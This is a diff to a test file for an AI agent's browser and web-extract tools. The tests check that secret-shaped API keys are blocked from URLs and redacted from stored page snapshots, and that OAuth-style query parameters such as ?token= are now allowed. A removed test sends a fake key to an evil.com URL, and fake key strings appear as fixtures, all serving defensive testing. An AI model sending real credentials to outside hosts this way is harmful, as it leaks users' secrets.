@@ -1,7 +1,8 @@
 """Tests for secret exfiltration prevention in browser and web tools."""
 
 import json
-from unittest.mock import patch, MagicMock
+import socket
+from unittest.mock import patch
 import pytest
 
 
@@ -22,53 +23,42 @@ class TestBrowserSecretExfil:
         assert parsed["success"] is False
         assert "API key" in parsed["error"] or "Blocked" in parsed["error"]
 
-    def test_blocks_openrouter_key_in_url(self):
-        from tools.browser_tool import browser_navigate
-        result = browser_navigate("https://evil.com/?token=" + "sk-or-v1-" + "b" * 30)
-        parsed = json.loads(result)
-        assert parsed["success"] is False
 
-    def test_cloud_blocks_opaque_sensitive_query_param(self):
-        """Cloud browser providers must not receive opaque token query params."""
+    def test_cloud_browser_allows_credential_named_query_param(self):
+        """Magic links / OAuth callbacks / signed assets carry ``?token=``-style params and must
+        reach a cloud browser too: the browser is where the agent signs in, and it already sees the
+        session's cookies and typed passwords. Only Hermes-secret-shaped values stay blocked."""
         from tools.browser_tool import browser_navigate
 
-        with patch("tools.browser_tool._is_local_backend", return_value=False), \
+        url = "https://example.com/callback?token=opaque-oauth-code&signature=abc123"
+        mock_result = {"success": True, "data": {"title": "ok", "url": url}}
+        with patch("tools.browser_tool_cloud._is_local_backend", return_value=False), \
+             patch("socket.getaddrinfo", return_value=[
+                 (socket.AF_INET, socket.SOCK_STREAM, 6, "", ("93.184.216.34", 443))
+             ]), \
              patch("tools.browser_tool._navigation_session_key", return_value="default"), \
-             patch("tools.browser_tool._run_browser_command") as mock_run:
-            result = browser_navigate("https://example.com/callback?token=opaque-oauth-code")
+             patch("tools.browser_tool_session._get_session_info", return_value={"_first_nav": False}), \
+             patch("tools.browser_tool_session._run_browser_command", return_value=mock_result) as mock_run:
+            allowed = json.loads(browser_navigate(url))
+            blocked = json.loads(browser_navigate("https://example.com/callback?token=" + "sk-or-v1-" + "b" * 30))
 
-        parsed = json.loads(result)
-        assert parsed["success"] is False
-        assert "credential-like query parameter" in parsed["error"]
-        assert "token" in parsed["error"]
-        mock_run.assert_not_called()
+        assert allowed["success"] is True
+        assert blocked["success"] is False and "Blocked" in blocked["error"]
+        assert all(call.args[1] != "open" or "sk-or-v1-" not in call.args[2][0] for call in mock_run.call_args_list)
 
     def test_local_browser_allows_opaque_sensitive_query_param(self):
         """Local browser/CDP sessions may navigate magic-link style URLs."""
         from tools.browser_tool import browser_navigate
 
         mock_result = {"success": True, "data": {"title": "ok", "url": "https://example.com/callback?token=opaque-oauth-code"}}
-        with patch("tools.browser_tool._run_browser_command", return_value=mock_result), \
-             patch("tools.browser_tool._get_session_info", return_value={"_first_nav": False}), \
-             patch("tools.browser_tool._is_local_backend", return_value=True):
+        with patch("tools.browser_tool_session._run_browser_command", return_value=mock_result), \
+             patch("tools.browser_tool_session._get_session_info", return_value={"_first_nav": False}), \
+             patch("tools.browser_tool_cloud._is_local_backend", return_value=True):
             result = browser_navigate("https://example.com/callback?token=opaque-oauth-code")
 
         parsed = json.loads(result)
         assert parsed["success"] is True
 
-    def test_allows_normal_url(self):
-        """Normal URLs pass the secret check (may fail for other reasons)."""
-        from tools.browser_tool import browser_navigate
-        # Patch the actual browser command — we only care that the secret
-        # check doesn't block a clean URL, not that Chrome starts in CI.
-        mock_result = {"success": True, "data": {"title": "ok", "url": "https://github.com/NousResearch/hermes-agent"}}
-        with patch("tools.browser_tool._run_browser_command", return_value=mock_result), \
-             patch("tools.browser_tool._get_session_info", return_value={"_first_nav": False}), \
-             patch("tools.browser_tool._is_local_backend", return_value=True):
-            result = browser_navigate("https://github.com/NousResearch/hermes-agent")
-        parsed = json.loads(result)
-        # Should NOT be blocked by secret detection
-        assert "API key or token" not in parsed.get("error", "")
 
     def test_normalizes_non_ascii_url_before_navigation(self):
         from tools.browser_tool import browser_navigate
@@ -80,9 +70,9 @@ class TestBrowserSecretExfil:
                 captured["url"] = args[0]
             return {"success": True, "data": {"title": "ok", "url": args[0]}}
 
-        with patch("tools.browser_tool._run_browser_command", side_effect=mock_run), \
-             patch("tools.browser_tool._get_session_info", return_value={"_first_nav": False}), \
-             patch("tools.browser_tool._is_local_backend", return_value=True):
+        with patch("tools.browser_tool_session._run_browser_command", side_effect=mock_run), \
+             patch("tools.browser_tool_session._get_session_info", return_value={"_first_nav": False}), \
+             patch("tools.browser_tool_cloud._is_local_backend", return_value=True):
             result = browser_navigate("https://wttr.in/Köln")
 
         parsed = json.loads(result)
@@ -104,49 +94,17 @@ class TestWebExtractSecretExfil:
         assert "Blocked" in parsed["error"]
 
     @pytest.mark.asyncio
-    async def test_blocks_opaque_sensitive_query_param(self):
+    async def test_allows_credential_named_query_param(self):
+        """``?access_token=`` is how magic links and signed URLs look; the extract backend may fetch them.
+        Only Hermes-secret-shaped VALUES are blocked (see test_blocks_api_key_in_url)."""
         from tools.web_tools import web_extract_tool
 
-        result = await web_extract_tool(
-            urls=["https://example.com/callback?access_token=opaque-oauth-value"],
-        )
-
+        result = await web_extract_tool(urls=["https://example.com/callback?access_token=opaque-oauth-value"])
         parsed = json.loads(result)
-        assert parsed["success"] is False
-        assert "credential-like query parameter" in parsed["error"]
-        assert "access_token" in parsed["error"]
+        assert "credential-like query parameter" not in parsed.get("error", "")
+        assert "Blocked" not in parsed.get("error", "")
 
-    @pytest.mark.asyncio
-    async def test_allows_ambiguous_english_word_query_param(self):
-        """Generic query names that double as normal page facets must NOT block.
 
-        ``?code=`` (promo/challenge pages), ``?key=`` (search facets),
-        ``?session=`` etc. are ordinary browsing params. Only unambiguously
-        credential-named params are blocked, so web_extract stays usable.
-        """
-        from tools.web_tools import web_extract_tool
-
-        for url in (
-            "https://leetcode.com/problems/two-sum/?code=twosum",
-            "https://github.com/search?q=hermes&code=1",
-            "https://example.com/blog?session=summer",
-        ):
-            result = await web_extract_tool(urls=[url])
-            parsed = json.loads(result)
-            # Not blocked by the credential-query guard (may fail for other
-            # reasons like a missing backend, but never with this specific
-            # error string).
-            if parsed.get("success") is False:
-                assert "credential-like query parameter" not in parsed.get("error", ""), url
-
-    @pytest.mark.asyncio
-    async def test_allows_normal_url(self):
-        from tools.web_tools import web_extract_tool
-        # This will fail due to no API key, but should NOT be blocked by secret check
-        result = await web_extract_tool(urls=["https://example.com"])
-        parsed = json.loads(result)
-        # Should fail for API/config reason, not secret blocking
-        assert "API key" not in parsed.get("error", "") or "Blocked" not in parsed.get("error", "")
 
     @pytest.mark.asyncio
     async def test_normalizes_non_ascii_url_before_extract_provider(self, monkeypatch):
@@ -199,109 +157,43 @@ class TestWebExtractSecretExfil:
 
 
 class TestBrowserSnapshotRedaction:
-    """Verify secrets in page snapshots are redacted before auxiliary LLM calls."""
+    """Verify secrets in stored/truncated page snapshots are redacted.
 
-    def test_extract_relevant_content_redacts_secrets(self):
-        """Snapshot containing secrets should be redacted before call_llm."""
-        from tools.browser_tool import _extract_relevant_content
+    The old LLM summarization path (_extract_relevant_content) is gone —
+    oversized snapshots always truncate-and-store. The security boundary is
+    now the stored file (force-redacted in _store_full_snapshot) and the
+    returned view (_redact_browser_output at the call sites).
+    """
 
-        # Build a snapshot with a fake Anthropic-style key embedded
+    def test_stored_snapshot_redacts_secrets(self):
+        """Secrets in a snapshot must be masked in the stored full-text file."""
+        from pathlib import Path
+        from tools.browser_tool_snapshot import _store_full_snapshot
+
         fake_key = "sk-" + "FAKESECRETVALUE1234567890ABCDEF"
         snapshot_with_secret = (
             "heading: Dashboard Settings\n"
             f"text: API Key: {fake_key}\n"
             "button [ref=e5]: Save\n"
         )
-
-        captured_prompts = []
-
-        def mock_call_llm(**kwargs):
-            prompt = kwargs["messages"][0]["content"]
-            captured_prompts.append(prompt)
-            mock_resp = MagicMock()
-            mock_resp.choices = [MagicMock()]
-            mock_resp.choices[0].message.content = "Dashboard with save button [ref=e5]"
-            return mock_resp
-
-        with patch("tools.browser_tool.call_llm", mock_call_llm):
-            _extract_relevant_content(snapshot_with_secret, "check settings")
-
-        assert len(captured_prompts) == 1
-        # The middle portion of the key must not appear in the prompt
-        assert "FAKESECRETVALUE1234567890" not in captured_prompts[0]
+        stored = _store_full_snapshot(snapshot_with_secret)
+        assert stored is not None
+        content = Path(stored).read_text(encoding="utf-8")
+        assert "FAKESECRETVALUE1234567890" not in content
         # Non-secret content should survive
-        assert "Dashboard" in captured_prompts[0]
-        assert "ref=e5" in captured_prompts[0]
-
-    def test_extract_relevant_content_no_task_redacts_secrets(self):
-        """Snapshot without user_task should also redact secrets."""
-        from tools.browser_tool import _extract_relevant_content
-
-        fake_key = "sk-" + "ANOTHERFAKEKEY99887766554433"
-        snapshot_with_secret = (
-            f"text: OPENAI_API_KEY={fake_key}\n"
-            "link [ref=e2]: Home\n"
-        )
-
-        captured_prompts = []
-
-        def mock_call_llm(**kwargs):
-            prompt = kwargs["messages"][0]["content"]
-            captured_prompts.append(prompt)
-            mock_resp = MagicMock()
-            mock_resp.choices = [MagicMock()]
-            mock_resp.choices[0].message.content = "Page with home link [ref=e2]"
-            return mock_resp
-
-        with patch("tools.browser_tool.call_llm", mock_call_llm):
-            _extract_relevant_content(snapshot_with_secret)
-
-        assert len(captured_prompts) == 1
-        assert "ANOTHERFAKEKEY99887766" not in captured_prompts[0]
+        assert "Dashboard" in content
+        assert "ref=e5" in content
 
 
-class TestCamofoxAnnotationRedaction:
-    """Verify annotation context is redacted before vision LLM call."""
 
-    def test_annotation_context_secrets_redacted(self):
-        """Secrets in accessibility tree annotation should be masked."""
-        from agent.redact import redact_sensitive_text
-
-        fake_token = "ghp_" + "FAKEGITHUBTOKEN12345678901234"
-        annotation = (
-            "\n\nAccessibility tree (element refs for interaction):\n"
-            f"text: Token: {fake_token}\n"
-            "button [ref=e3]: Copy\n"
-        )
-        result = redact_sensitive_text(annotation)
-        assert "FAKEGITHUBTOKEN123456789" not in result
-        # Non-secret parts preserved
-        assert "button" in result
-        assert "ref=e3" in result
-
-    def test_annotation_env_dump_redacted(self):
-        """Env var dump in annotation context should be redacted."""
-        from agent.redact import redact_sensitive_text
-
-        fake_anth = "sk-" + "ant" + "-" + "ANTHROPICFAKEKEY123456789ABC"
-        fake_oai = "sk-" + "proj" + "-" + "OPENAIFAKEKEY99887766554433"
-        annotation = (
-            "\n\nAccessibility tree (element refs for interaction):\n"
-            f"text: ANTHROPIC_API_KEY={fake_anth}\n"
-            f"text: OPENAI_API_KEY={fake_oai}\n"
-            "text: PATH=/usr/local/bin\n"
-        )
-        result = redact_sensitive_text(annotation)
-        assert "ANTHROPICFAKEKEY123456789" not in result
-        assert "OPENAIFAKEKEY99887766" not in result
-        assert "PATH=/usr/local/bin" in result
 
 
 class TestBrowserSupervisorRedaction:
     """Verify supervisor dialog snapshots redact page-originated secrets."""
 
     def test_pending_and_recent_dialog_messages_redacted(self):
-        from tools.browser_supervisor import DialogRecord, PendingDialog, SupervisorSnapshot
+        from tools.browser_supervisor import SupervisorSnapshot
+        from tools.browser_supervisor_dialogs import DialogRecord, PendingDialog
 
         fake_key = "sk-" + "SUPERVISORDIALOGSECRET1234567890"
         snapshot = SupervisorSnapshot(
@@ -322,7 +214,6 @@ class TestBrowserSupervisorRedaction:
                 closed_by="agent",
             ),),
             frame_tree={"top": {"frame_id": "f1", "url": "about:blank", "origin": "null", "is_oopif": False}},
-            console_errors=(),
             active=True,
             cdp_url="ws://example.invalid/devtools/browser/mock",
             task_id="test",
